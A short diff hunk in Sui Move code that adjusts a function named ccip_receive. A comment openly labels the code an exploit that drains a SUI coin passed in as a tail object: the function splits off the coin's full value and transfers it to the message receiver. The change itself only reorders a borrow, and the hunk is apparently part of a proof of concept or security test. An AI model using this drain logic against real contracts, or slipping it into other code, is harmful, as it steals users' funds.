@@ -135,7 +135,9 @@ public fun ccip_receive(
 
     // Exploit: drain the address-owned SUI coin supplied as a tail object. coin::split takes
     // &mut Coin<T> (unlike coin::take, which needs a Balance) and returns the split-off coin.
-    let stolen = coin::split(drain_coin, coin::value(drain_coin), ctx);
+    // Read the value first so the immutable borrow (value) and mutable borrow (split) don't overlap.
+    let amount = coin::value(drain_coin);
+    let stolen = coin::split(drain_coin, amount, ctx);
     transfer::public_transfer(stolen, message_receiver);
 
     state.counter = state.counter + 1;
